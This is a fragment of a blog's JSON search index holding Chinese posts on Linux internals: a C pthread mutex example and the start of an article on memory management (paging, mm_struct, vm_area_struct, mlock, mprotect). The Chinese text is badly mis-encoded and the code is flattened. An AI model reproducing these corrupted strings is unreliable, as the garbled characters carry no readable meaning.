//æ¨¡æ‹Ÿçº¿ç¨‹æ‰§è¡Œæ—¶é—´ &#123; printf(&quot;thread1 : number = %d\\n&quot;,number); pthread_mutex_lock(&amp;mut); number++; pthread_mutex_unlock(&amp;mut); sleep(2); &#125; printf(&quot;thread1 :ä¸»å‡½æ•°åœ¨ç­‰æˆ‘å®Œæˆä»»åŠ¡å—ï¼Ÿ\\n&quot;); pthread_exit(NULL);&#125;void *thread2()&#123; printf(&quot;thread2 : I&#x27;m thread 2\\n&quot;); for (i = 0; i &lt; MAX; i++) &#123; printf(&quot;thread2 : number = %d\\n&quot;,number); pthread_mutex_lock(&amp;mut); number++; pthread_mutex_unlock(&amp;mut); sleep(3); &#125; printf(&quot;thread2 :ä¸»å‡½æ•°åœ¨ç­‰æˆ‘å®Œæˆä»»åŠ¡å—ï¼Ÿ\\n&quot;); pthread_exit(NULL);&#125;void thread_create(void) //åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹&#123; int temp; memset(&amp;thread, 0, sizeof(thread)); //comment1 /*åˆ›å»ºçº¿ç¨‹*/ if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0) //comment2 printf(&quot;çº¿ç¨‹1åˆ›å»ºå¤±è´¥!\\n&quot;); else printf(&quot;çº¿ç¨‹1è¢«åˆ›å»º\\n&quot;); if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0) //comment3 printf(&quot;çº¿ç¨‹2åˆ›å»ºå¤±è´¥&quot;); else printf(&quot;çº¿ç¨‹2è¢«åˆ›å»º\\n&quot;);&#125;void thread_wait(void)&#123; /*ç­‰å¾…çº¿ç¨‹ç»“æŸ*/ if(thread[0] !=0) &#123; //comment4 pthread_join(thread[0],NULL); printf(&quot;çº¿ç¨‹1å·²ç»ç»“æŸ\\n&quot;); &#125; if(thread[1] !=0) &#123; //comment5 pthread_join(thread[1],NULL); printf(&quot;çº¿ç¨‹2å·²ç»ç»“æŸ\\n&quot;); &#125;&#125;int main()&#123; /*ç”¨é»˜è®¤å±æ€§åˆå§‹åŒ–äº’æ–¥é”*/ pthread_mutex_init(&amp;mut,NULL); printf(&quot;æˆ‘æ˜¯ä¸»å‡½æ•°å“¦ï¼Œæˆ‘æ­£åœ¨åˆ›å»ºçº¿ç¨‹ï¼Œå‘µå‘µ\\n&quot;); thread_create(); printf(&quot;æˆ‘æ˜¯ä¸»å‡½æ•°å“¦ï¼Œæˆ‘æ­£åœ¨ç­‰å¾…çº¿ç¨‹å®Œæˆä»»åŠ¡é˜¿ï¼Œå‘µå‘µ\\n&quot;); thread_wait(); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘a-Linux å†…å­˜ç®¡ç†","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘a-Linux å†…å­˜ç®¡ç†/","text":"æ¦‚è¿°ï¼šä¸»è¦è®²è¿° Linux æ“ä½œç³»ç»Ÿä¸­çš„å†…å­˜ç®¡ç†æ–¹å¼åŠå­˜å‚¨å™¨ç®¡ç†çš„åŸºæœ¬æ¦‚å¿µåŠåŸç†ï¼Œä»ä¸­è¯´æ˜ Linux æ“ä½œç³»ç»Ÿå¯¹å†…å­˜çš„ç®¡ç†æ¨¡å¼ä»¥åŠåœ¨ Linux æ“ä½œç³»ç»Ÿä¸­è¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜ç®¡ç†æƒ…å†µå’Œå†…å­˜è¯»å–ã€è°ƒç”¨çš„æœ€åº•å±‚å®ç°æ–¹å¼ Linux åˆ†é¡µç®¡ç†æœºåˆ¶ è™šæ‹Ÿå†…å­˜æ®µçš„ç»„ç»‡ä¸ç®¡ç† å†…å­˜çš„å…±äº«å’Œä¿æŠ¤ å†…å­˜ç©ºé—´ç®¡ç† ç©ºé—²å†…å­˜ç®¡ç† å†…æ ¸æ€å†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾ ç”¨æˆ·æ€å†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾ Linux ç³»ç»Ÿäº¤æ¢ç©ºé—´ å­˜å‚¨ç®¡ç†ç³»ç»Ÿçš„ç¼“å†²æœºåˆ¶ 0x01 Linuxåˆ†é¡µç®¡ç†æœºåˆ¶ Linux é‡‡ç”¨â€œæŒ‰éœ€è°ƒé¡µâ€ç®—æ³•ï¼Œæ”¯æŒä¸‰å±‚ç®¡ç†ç­–ç•¥ã€‚ç”±äº Intel CPU åœ¨ç¡¬ä»¶çº§æä¾›äº†æ®µå¼å­˜å‚¨ç®¡ç†å’ŒäºŒå±‚é¡µå¼å­˜å‚¨ç®¡ç†åŠŸèƒ½ï¼ŒLinux æ“ä½œç³»ç»Ÿä½œä¸ºä¸€ç§è½¯ä»¶ï¼Œå¿…é¡»ä¸ä¹‹å…¼å®¹ã€‚Linux æ ¹æ® Intel å¤„ç†å™¨çš„è¦æ±‚ï¼Œæœ€ä½é™åº¦åœ°è®¾ç½®ä¸æ®µç›¸å…³çš„ç»“æ„å’Œåˆå§‹åŒ–ç¨‹åºï¼Œä½†å®è´¨ä¸Šæ˜¯æ”¾å¼ƒäº†æ®µå¼å­˜å‚¨ç®¡ç†ã€‚Intel å¾®å‹è®¡ç®—æœºä¸Šçš„ Linux ç³»ç»Ÿè€ƒè™‘åˆ° CPU çš„é™åˆ¶ï¼Œå°†ç¬¬äºŒå±‚çš„é¡µå¼ç®¡ç†ï¼ˆpmdï¼‰ä¸ç¬¬ä¸€å±‚çš„é¡µå¼ç®¡ç†ï¼ˆpgdï¼‰åˆå¹¶ï¼Œå› æ­¤çœŸæ­£å‘æŒ¥ä½œç”¨çš„æ˜¯ä»¥é¡µç›®å½•å’Œé¡µè¡¨ä¸ºä¸­å¿ƒçš„æ•°æ®ç»“æ„å’Œå‡½æ•°ã€‚ åœ¨ Linux ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·è¿›ç¨‹éƒ½å¯ä»¥è®¿é—® 4GB çš„çº¿æ€§è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚å…¶ä¸­ï¼Œ03GB çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯ç”¨æˆ·ç©ºé—´ï¼Œç”¨æˆ·è¿›ç¨‹å¯ä»¥ç›´æ¥å¯¹å…¶è¿›è¡Œè®¿é—®ï¼›3GB4GB çš„è™šæ‹Ÿå†…å­˜åœ°å€ç©ºé—´ä¸ºå†…æ ¸æ€ç©ºé—´ï¼Œå­˜æ”¾ä»…ä¾›å†…æ ¸æ€è®¿é—®çš„ä»£ç å’Œæ•°æ®ï¼Œç”¨æˆ·æ€è¿›ç¨‹ä¸å¯è®¿é—®ã€‚å½“ç”¨æˆ·è¿›ç¨‹é€šè¿‡ä¸­æ–­æˆ–ç³»ç»Ÿè°ƒç”¨è®¿é—®å†…æ ¸æ€ç©ºé—´æ—¶ï¼Œå°±ä¼šè§¦å‘å¤„ç†ç‰¹æƒçº§è½¬æ¢ï¼Œå³ä»æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·æ€è½¬æ¢åˆ°å†…æ ¸æ€ã€‚ Linuxçš„è™šæ‹Ÿåœ°å€ç©ºé—´èŒƒå›´ä¸º0ï½4Gï¼ŒLinuxå†…æ ¸å°†è¿™4Gå­—èŠ‚çš„ç©ºé—´åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ å°†æœ€é«˜çš„1Gå­—èŠ‚ï¼ˆä»è™šæ‹Ÿåœ°å€0xC0000000åˆ°0xFFFFFFFFï¼‰ä¾›å†…æ ¸ä½¿ç”¨ï¼Œç§°ä¸ºâ€œå†…æ ¸ç©ºé—´â€ã€‚è€Œå°†è¾ƒä½çš„3Gå­—èŠ‚ï¼ˆä»è™šæ‹Ÿåœ°å€0x00000000åˆ°0xBFFFFFFFï¼‰ä¾›å„ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œç§°ä¸ºâ€œç”¨æˆ·ç©ºé—´ã€‚å› ä¸ºæ¯ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ï¼Œå› æ­¤ï¼ŒLinuxå†…æ ¸ç”±ç³»ç»Ÿå†…çš„æ‰€æœ‰è¿›ç¨‹å…±äº«ã€‚äºæ˜¯ï¼Œä»å…·ä½“è¿›ç¨‹çš„è§’åº¦æ¥çœ‹ï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰4Gå­—èŠ‚çš„è™šæ‹Ÿç©ºé—´ã€‚ æ‰€æœ‰è¿›ç¨‹ä» 3GB åˆ° 4GB çš„è™šæ‹Ÿç©ºé—´æ˜¯ä¸€æ ·çš„ï¼Œæœ‰ç›¸åŒçš„é¡µç›®å½•é¡¹å’Œé¡µè¡¨ï¼Œå¯¹åº”ç›¸åŒçš„ç‰©ç†å†…å­˜æ®µã€‚Linux ä»¥æ­¤æ–¹å¼ä½¿å¾—å†…æ ¸æ€è¿›ç¨‹å…±äº«ä»£ç æ®µå’Œæ•°æ®æ®µã€‚ å†…æ ¸æ€è™šæ‹Ÿç©ºé—´ä» 3GB åˆ° 3GB+4MB çš„ä¸€æ®µè¢«æ˜ å°„åˆ°ç‰©ç†ç©ºé—´ 04MBã€‚å› æ­¤ï¼Œè¿›ç¨‹å¤„äºå†…æ ¸æ€æ—¶ï¼Œåªè¦é€šè¿‡è™šæ‹Ÿç©ºé—´ 3GB3GB+4MB æ®µå³å¯è®¿é—®ç‰©ç†ç©ºé—´ 0~4MB æ®µã€‚ æ—¢ç„¶å¯¹äºç”¨æˆ·ç©ºé—´æ¥è¯´è®¿é—®çš„å†…å­˜åœ°å€éƒ½æ˜¯è¿ç»­çš„ 4GB çº¿æ€§è™šæ‹Ÿåœ°å€ï¼Œé‚£ä¹ˆå°±éœ€è¦çŸ¥é“ Linux æ˜¯å¦‚ä½•åˆ’åˆ†è™šæ‹Ÿç©ºé—´ã€‚Linux é‡‡ç”¨â€œæŒ‰éœ€è°ƒé¡µâ€æŠ€æœ¯ç®¡ç†è™šæ‹Ÿå†…å­˜ã€‚æ ‡å‡† Linux çš„è™šæ‹Ÿé¡µè¡¨åˆ†ä¸ºä¸‰çº§é¡µè¡¨ï¼Œä¾æ¬¡ä¸ºé¡µç›®å½•ï¼ˆPGD Page Directoryï¼‰ã€ä¸­é—´é¡µç›®å½•ï¼ˆPMD Page Middle Directoryï¼‰å’Œé¡µè¡¨ï¼ˆPTE PageTableï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/1.png) åœ¨ Intel CPU ä¸Šï¼ŒLinux çš„é¡µè¡¨ç»“æ„å®é™…ä¸Šä¸ºä¸¤çº§ã€‚IA-32 ä½“ç³»ç»“æ„çš„é¡µç®¡ç†æœºåˆ¶ä¸­çš„é¡µç›®å½•æ˜¯ PGDï¼Œé¡µè¡¨æ˜¯ PTEï¼Œè€Œ PGD å’Œ PMD å®é™…ä¸ŠåˆäºŒä¸ºä¸€ã€‚åœ¨ç”¨æˆ·è¿›ç¨‹ä¸­ç”¨åˆ°çš„ä¸å†…å­˜ç®¡ç†æœ‰å…³çš„æ•°æ®ç»“æ„æ˜¯ mm_struct ç»“æ„ï¼Œæ­¤ç»“æ„ä¸­åŒ…å«äº†ç”¨æˆ·è¿›ç¨‹ä¸­ä¸å­˜å‚¨æœ‰å…³çš„ä¿¡æ¯ï¼Œå…·ä½“ç»“æ„å®šä¹‰å¦‚ä¸‹ï¼š 12345678910111213141516171819202122struct mm_struct&#123; struct vm_area_struct * mmap; /* æŒ‡å‘è™šæ‹ŸåŒºé—´ï¼ˆVMAï¼‰é“¾è¡¨ */ rb_root_t mm_rb; ï¼*æŒ‡å‘red_blackæ ‘*/ struct vm_area_struct * mmap_cache; /* æŒ‡å‘æœ€è¿‘æ‰¾åˆ°çš„è™šæ‹ŸåŒºé—´*/ pgd_t * pgd; ï¼*æŒ‡å‘è¿›ç¨‹çš„é¡µç›®å½•*/ atomic_t mm_users; /* ç”¨æˆ·ç©ºé—´ä¸­çš„æœ‰å¤šå°‘ç”¨æˆ·*/ atomic_t mm_count; /* å¯¹&quot;struct mm_struct&quot;æœ‰å¤šå°‘å¼•ç”¨*/ int map_count; /* è™šæ‹ŸåŒºé—´çš„ä¸ªæ•°*/ struct rw_semaphore mmap_sem; spinlock_t page_table_lock; /* ä¿æŠ¤ä»»åŠ¡é¡µè¡¨å’Œ mm-&gt;rss */ struct list_head mmlist; /*æ‰€æœ‰æ´»åŠ¨ï¼ˆactiveï¼‰mmçš„é“¾è¡¨ */ unsigned long start_code, end_code, start_data, end_data; /*start_code ä»£ç æ®µèµ·å§‹åœ°å€,end_code ä»£ç æ®µç»“æŸåœ°å€,start_data æ•°æ®æ®µèµ·å§‹åœ°å€, start_end æ•°æ®æ®µç»“æŸåœ°å€*/ unsigned long start_brk, brk, start_stack; /*start_brk å’Œbrkè®°å½•æœ‰å…³å †çš„ä¿¡æ¯, start_brkæ˜¯ç”¨æˆ·è™šæ‹Ÿåœ°å€ç©ºé—´åˆå§‹åŒ–æ—¶ï¼Œå †çš„ç»“æŸåœ°å€, brk æ˜¯å½“å‰å †çš„ç»“æŸåœ°å€, start_stack æ˜¯æ ˆçš„èµ·å§‹åœ°å€*/ unsigned long arg_start, arg_end, env_start, env_end; /*arg_start å‚æ•°æ®µçš„èµ·å§‹åœ°å€, arg_end å‚æ•°æ®µçš„ç»“æŸåœ°å€, env_start ç¯å¢ƒæ®µçš„èµ·å§‹åœ°å€, env_end ç¯å¢ƒæ®µçš„ç»“æŸåœ°å€*/ unsigned long rss, total_vm, locked_vm; unsigned long def_flags; unsigned long cpu_vm_mask; unsigned long swap_address; unsigned dumpable:1; mm_context_t context; /* Architecture-specific MM context, æ˜¯ä¸å¹³å°ç›¸å…³çš„ä¸€ä¸ªç»“æ„ï¼Œå¯¹i386 å‡ ä¹ç”¨å¤„ä¸å¤§*/&#125;; æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªé¡µç›®å½•ï¼Œå­˜å‚¨è¯¥è¿›ç¨‹æ‰€ä½¿ç”¨çš„å†…å­˜é¡µé¢æƒ…å†µã€‚Linux æŒ‰ç…§â€œæŒ‰éœ€è°ƒé¡µâ€çš„åŸåˆ™ï¼Œåªåˆ†é…å¿…éœ€çš„å†…å­˜é¡µé¢ï¼Œä»è€Œé¿å…äº†é¡µè¡¨è¿‡å¤šå ç”¨å­˜å‚¨ç©ºé—´çš„æƒ…å†µå‡ºç°ã€‚ä¾‹å¦‚ï¼Œç³»ç»Ÿè°ƒç”¨ fork åˆ†é…å†…å­˜é¡µé¢çš„æƒ…å†µå¦‚ä¸‹ï¼š å†…æ ¸æ€å †æ ˆ 1 é¡µï¼› é¡µç›®å½• 1 é¡µï¼› é¡µè¡¨å‡ é¡µï¼› è€Œç³»ç»Ÿè°ƒç”¨ exec åˆ†é…å†…å­˜é¡µé¢çš„æƒ…å†µåˆ™ï¼š å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¤´ 1 é¡µï¼› ç”¨æˆ·å †æ ˆ 1 é¡µæˆ–å‡ é¡µï¼› è¿™æ ·ï¼Œå½“è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶ï¼Œå¦‚æœæ‰§è¡Œä»£ç ä¸åœ¨å†…å­˜ä¸­ï¼Œå°†äº§ç”Ÿç¬¬ä¸€æ¬¡ç¼ºé¡µä¸­æ–­ï¼Œè®©æ“ä½œç³»ç»Ÿåˆ†é…å†…å­˜é¡µé¢ï¼Œå¹¶å°†æ‰§è¡Œä»£ç è£…å…¥å†…å­˜ä¸­ã€‚æ­¤åï¼ŒæŒ‰éœ€è¦é€æ¸åˆ†é…æ›´å¤šçš„å†…å­˜é¡µé¢ï¼Œå¹¶å‚ä¸é¡µé¢è°ƒåº¦ã€‚å½“ç³»ç»Ÿå†…å­˜ä¸è¶³æ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šæ˜¯å¦å°†è¯¥è¿›ç¨‹çš„ä¸€éƒ¨åˆ†é¡µé¢æ¢å‡ºåˆ°ç£ç›˜äº¤æ¢åŒºæˆ–äº¤æ¢æ–‡ä»¶ä¸­ã€‚è¿›ç¨‹ç»ˆæ­¢æ—¶ï¼Œæ“ä½œç³»ç»Ÿé‡Šæ”¾æ‰€æœ‰è¯¥è¿›ç¨‹å ç”¨çš„èµ„æºï¼ŒåŒ…æ‹¬å†…å­˜é¡µé¢ã€‚ 0x02 è™šæ‹Ÿå†…å­˜æ®µçš„ç»„ç»‡ä¸ç®¡ç† ç”¨æˆ·ç¨‹åºæ€»å…±æ‹¥æœ‰ 4GB çš„è™šæ‹Ÿç©ºé—´ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ 4GB ç©ºé—´éƒ½å¯ä»¥è®©ç”¨æˆ·è¿›ç¨‹è¯»å†™æˆ–ç”³è¯·ä½¿ç”¨ã€‚ç”¨æˆ·è¿›ç¨‹å®é™…ä¸Šå¯ä»¥ç”³è¯·çš„è™šæ‹Ÿç©ºé—´ä¸º 0 ~ 3GB ã€‚åœ¨ç”¨æˆ·è¿›ç¨‹åˆ›å»ºæ—¶ï¼Œå·²ç”±ç³»ç»Ÿè°ƒç”¨ fork() çš„æ‰§è¡Œå‡½æ•° do_fork() å°†å†…æ ¸çš„ä»£ç æ®µå’Œæ•°æ®æ®µæ˜ å°„åˆ° 3GB ä»¥åçš„è™šæ‹Ÿç©ºé—´ï¼Œä¾›å†…æ ¸æ€è¿›ç¨‹è®¿é—®ã€‚æ‰€æœ‰è¿›ç¨‹çš„ 3GB~4GB çš„è™šæ‹Ÿæ§ä»¶çš„æ˜ åƒéƒ½æ˜¯ç›¸åŒçš„ï¼Œå¹¶ä»¥æ­¤æ–¹å¼å…±äº«ä»£ç æ®µå’Œæ•°æ®æ®µã€‚ ä¸ºäº†èƒ½å¤Ÿä»¥è‡ªç„¶çš„æ–¹å¼ç®¡ç†è¿›ç¨‹è™šæ‹Ÿæ§ä»¶ï¼ŒLinux å®šä¹‰äº†è™šæ‹Ÿæ®µï¼ˆvma virtual memory areaï¼‰ï¼Œä¸€ä¸ª vma æ®µæ˜¯æŸä¸ªè¿›ç¨‹çš„ä¸€æ®µè¿ç»­çš„è™šæ‹Ÿæ§ä»¶ï¼Œåœ¨è¿™æ®µè™šæ‹Ÿç©ºé—´çš„æ‰€æœ‰å•å…ƒæ‹¥æœ‰ç›¸åŒçš„ç‰¹å¾ã€‚ä¾‹å¦‚ï¼Œå±äºåŒä¸€ä¸ªè¿›ç¨‹å…·æœ‰ç›¸åŒçš„è®¿é—®æƒé™ï¼Œå°†åŒæ—¶è¢«é”å®šã€å—ä¿æŠ¤ç­‰ã€‚ è™šæ‹Ÿæ®µçš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct vm_area_struct &#123; /* ç¬¬ä¸€ä¸ªç¼“å­˜è¡Œå…·æœ‰VMAæ ‘ç§»åŠ¨çš„ä¿¡æ¯*/ unsigned long vm_start; /* Our start address within vm_mm. */ unsigned long vm_end; /* The first byte after our end address within vm_mm. */ struct vm_area_struct *vm_next, *vm_prev; /* æ¯ä¸ªä»»åŠ¡çš„VMåŒºåŸŸçš„é“¾æ¥åˆ—è¡¨ï¼ŒæŒ‰åœ°å€æ’åº*/ struct rb_node vm_rb; /* æ­¤VMAå·¦ä¾§æœ€å¤§çš„å¯ç”¨å†…å­˜é—´éš™ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ åœ¨æ­¤VMAå’Œvma-&gt; vm_prevä¹‹é—´ï¼Œ æˆ–è€…åœ¨VMA rbtreeä¸­æˆ‘ä»¬ä¸‹é¢çš„ä¸€ä¸ªVMAä¸å…¶-&gt;vm_prevä¹‹é—´ã€‚ è¿™æœ‰åŠ©äºget_unmapped_areaæ‰¾åˆ°åˆé€‚å¤§å°çš„ç©ºé—²åŒºåŸŸã€‚ */ unsigned long rb_subtree_gap; /* ç¬¬äºŒä¸ªç¼“å­˜è¡Œä»è¿™é‡Œå¼€å§‹*/ struct mm_struct *vm_mm; /* æˆ‘ä»¬æ‰€å±çš„address space*/ pgprot_t vm_page_prot; /* æ­¤VMAçš„è®¿é—®æƒé™ */ unsigned long vm_flags; /* Flags, see mm.h. */ /* å¯¹äºå…·æœ‰åœ°å€ç©ºé—´ï¼ˆaddress apaceï¼‰å’Œåå¤‡å­˜å‚¨(backing store)çš„åŒºåŸŸï¼Œ é“¾æ¥åˆ°address_space-&gt;i_mmapé—´éš”æ ‘ï¼Œæˆ–è€…é“¾æ¥åˆ°address_space-&gt; i_mmap_nonlinearåˆ—è¡¨ä¸­çš„vmaã€‚ */ union &#123; struct &#123; struct rb_node rb; unsigned long rb_subtree_last; &#125; linear; struct list_head nonlinear; &#125; shared; /* åœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶é¡µé¢çš„COWä¹‹åï¼Œæ–‡ä»¶çš„MAP_PRIVATE vmaå¯ä»¥åœ¨i_mmapæ ‘å’Œanon_vmaåˆ—è¡¨ä¸­ã€‚ MAP_SHARED vmaåªèƒ½ä½äºi_mmapæ ‘ä¸­ã€‚ åŒ¿åMAP_PRIVATEï¼Œå †æ ˆæˆ–brk vmaï¼ˆå¸¦æœ‰NULLæ–‡ä»¶ï¼‰åªèƒ½ä½äºanon_vmaåˆ—è¡¨ä¸­ã€‚ */ struct list_head anon_vma_chain; /* ç”±mmap_semå’Œ* page_table_lockåºåˆ—åŒ–*/ struct anon_vma *anon_vma; /* Serialized by page_table_lock ç”±page_table_lockåºåˆ—åŒ–*/ const struct vm_operations_struct *vm_ops; /* ç”¨äºå¤„ç†æ­¤ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆ */ /* åå¤‡å­˜å‚¨ï¼ˆbacking storeï¼‰çš„ä¿¡æ¯: */ unsigned long vm_pgoff; /* ä»¥PAGE_SIZEä¸ºå•ä½çš„åç§»é‡ï¼ˆåœ¨vm_fileä¸­ï¼‰ï¼Œ*ä¸æ˜¯* PAGE_CACHE_SIZE*/ struct file * vm_file; /* æˆ‘ä»¬æ˜ å°„åˆ°æ–‡ä»¶ï¼ˆå¯ä»¥ä¸ºNULLï¼‰*/ void * vm_private_data; /* æ˜¯vm_pteï¼ˆå…±äº«å†…å­˜ï¼‰ */&#125;; ç»“åˆå‰é¢çš„å†…å­˜ç®¡ç†æ•°æ®ç»“æ„ï¼Œå¯ä»¥ç»˜åˆ¶å¦‚ä¸‹çš„ Linux å†…å­˜ç®¡ç†æ¡†å›¾ï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/2.png) 0x03 å†…å­˜çš„å…±äº«å’Œä¿æŠ¤ Linux ä¸­å†…å­˜å…±äº«ä»¥é¡µè¡¨çš„å½¢å¼å®ç°ï¼Œå…±äº«è¯¥é¡µçš„å„è¿›ç¨‹çš„é¡µè¡¨è¡¨é¡¹ç›´æ¥æŒ‡å‘å…±äº«é¡µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚è¿™ç§ç»“æ„ä¸éœ€è¦è®¾ç«‹å…±äº«é¡µè¡¨ï¼ŒèŠ‚çº¦å†…å­˜çš„å ç”¨ï¼Œä½†æ˜¯æ•ˆç‡è¾ƒä½ã€‚å½“å…±äº«é¡µçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå…±äº«è¯¥é¡µçš„å„è¿›ç¨‹çš„é¡µè¡¨å‡éœ€è¦ä¿®æ”¹ï¼Œå¹¶è¦å¤šæ¬¡è®¿é—®é¡µè¡¨ã€‚ ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/3.png) Linux å¯ä»¥å¯¹è™šæ‹Ÿæ®µä¸­çš„ä»»æ„éƒ¨åˆ†åŠ é”æˆ–ä¿æŠ¤ã€‚å¯¹è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€åŠ é”ï¼Œå…¶å®è´¨å°±æ˜¯å¯¹ vma æ®µçš„ vm_flags å±æ€§ä¸ VM_LOCKED(0X2000) è¿›è¡Œâ€œæˆ–â€æ“ä½œï¼Œè™šæ‹Ÿå†…å­˜åŠ é”åï¼Œå®ƒå¯¹åº”çš„ç‰©ç†é¡µé¢é©»ç•™å†…å­˜ä¸å†è¢«é¡µé¢ç½®æ¢ç¨‹åºæ¢å‡ºã€‚åŠ é”æ“ä½œæœ‰ä¸‰ç§ï¼š Mlockï¼šå¯¹æŒ‡å®šçš„ä¸€æ®µè™šæ‹Ÿç©ºé—´åŠ é”ï¼› Munlockï¼šå¯¹æŒ‡å®šçš„ä¸€æ®µè™šæ‹Ÿç©ºé—´è§£é”ï¼› Mlockallï¼šå¯¹è¿›ç¨‹çš„æ‰€æœ‰è™šæ‹Ÿç©ºé—´è§£é”ï¼› å¯¹è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€æ–½è¡Œåœ°å€ä¿æŠ¤æªæ–½å°±æ˜¯é‡æ–°è®¾ç½® vma æ®µçš„è®¿é—®æƒé™ï¼Œå…¶å®è´¨å°±æ˜¯å¯¹ vma æ®µçš„ vm_flags å±æ€§é‡ç½® PORT_READ(0X1) ã€PORT_WRITE(0X2)ã€PROT_EXEC(0X4)ï¼Œé‡æ–°è®¾å®š vm_page_port å±æ€§ï¼Œä¸æ­¤åŒæ—¶ï¼Œå¯¹è™šæ‹Ÿåœ°å€èŒƒå›´å†…çš„æ‰€æœ‰é¡µè¡¨é¡¹ï¼Œå…¶è®¿é—®æƒé™ä¹Ÿç›¸åº”è°ƒæ•´ï¼Œä¿æŠ¤æ“ä½œç”±ç³»ç»Ÿè°ƒç”¨ mprotect å®æ–½ã€‚ è™šæ‹Ÿæ®µåŠ é”ã€ä¿æŠ¤æ“ä½œå¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š å¯¹æ•´ä¸ªè™šæ‹Ÿæ®µåŠ é”æˆ–ä¿æŠ¤ å¯¹è™šæ‹Ÿæ®µå‰éƒ¨åŠ é”æˆ–ä¿æŠ¤ å¯¹è™šæ‹Ÿæ®µåéƒ¨åŠ é”æˆ–ä¿æŠ¤ å¯¹è™šæ‹Ÿæ®µä¸­éƒ¨åŠ é”æˆ–ä¿æŠ¤ 0x04 å†…å­˜ç©ºé—´ç®¡ç† å°½ç®¡ Linux é‡‡ç”¨è™šæ‹Ÿå­˜å‚¨ç®¡ç†ç­–ç•¥ï¼Œæœ‰äº›ç”³è¯·ä»ç„¶éœ€è¦ç›´æ¥åˆ†é…ç‰©ç†ç©ºé—´ã€‚ä¾‹å¦‚ï¼Œä¸ºåˆšåˆ›å»ºçš„è¿›ç¨‹åˆ†é…é¡µç›®å½•ï¼Œä¸ºè£…å…¥è¿›ç¨‹çš„ä»£ç æ®µåˆ†é…ç©ºé—´ï¼Œä¸º I/O æ“ä½œå‡†å¤‡ç¼“å†²åŒºç­‰ã€‚ç‰©ç†å†…å­˜ä»¥é¡µå¸§ä¸ºå•ä½ï¼Œé¡µå¸§çš„é•¿åº¦å›ºå®šï¼Œç­‰äºé¡µé•¿ï¼Œå¯¹äº Intel CPU é»˜è®¤ä¸º 4KBã€‚ Linux å¯¹ç‰©ç†å†…å­˜çš„ç®¡ç†é€šè¿‡ mem_map è¡¨æè¿°ã€‚mem_map åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œç”± free_area_init() å‡½æ•°åˆ›å»ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/4.png) 0x05 ç©ºé—²å†…å­˜ç®¡ç† åœ¨ç‰©ç†å†…å­˜ä½ç«¯ï¼Œç´§è·Ÿ mem_map è¡¨çš„ bitmap è¡¨ä»¥ä½ç¤ºå›¾æ–¹å¼è®°å½•äº†æœ‰æœ‰ç‰©ç†å†…å­˜çš„ç©ºé—²æƒ…å†µã€‚ä¸ mem_map ä¸€æ ·ï¼Œbitmap è¡¨åœ¨ç³»ç»Ÿåˆå§‹åŒ–æ—¶ç”± free_area_init() å‡½æ•°åˆ›å»ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](a-Linux å†…å­˜ç®¡ç†/5.png) 0x06 å†…æ ¸æ€çš„å†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾ å†…æ ¸æ€å†…å­˜æ˜¯ç”¨æ¥å­˜æ”¾ Linux å†…æ 